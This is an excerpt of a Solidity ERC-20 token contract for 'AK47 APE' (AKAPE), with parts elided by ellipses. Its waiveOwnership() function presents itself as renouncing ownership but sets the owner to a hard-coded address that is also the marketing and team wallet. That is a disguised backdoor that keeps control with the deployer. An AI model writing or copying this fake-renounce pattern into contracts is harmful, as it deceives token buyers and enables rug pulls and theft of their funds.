...
/**
Telegram : https://t.me/AK47ApeCoin
*/
...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x3c19C6ac23B4371Dd940703Ac20B95744898E69b);
    }
...
contract AK47APE is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "AK47 APE";
    string private _symbol = "AKAPE";
    uint8 private _decimals = 9;

    address payable private marketingWalletAddress = payable(0x3c19C6ac23B4371Dd940703Ac20B95744898E69b);
    address payable private teamWalletAddress = payable(0x3c19C6ac23B4371Dd940703Ac20B95744898E69b);
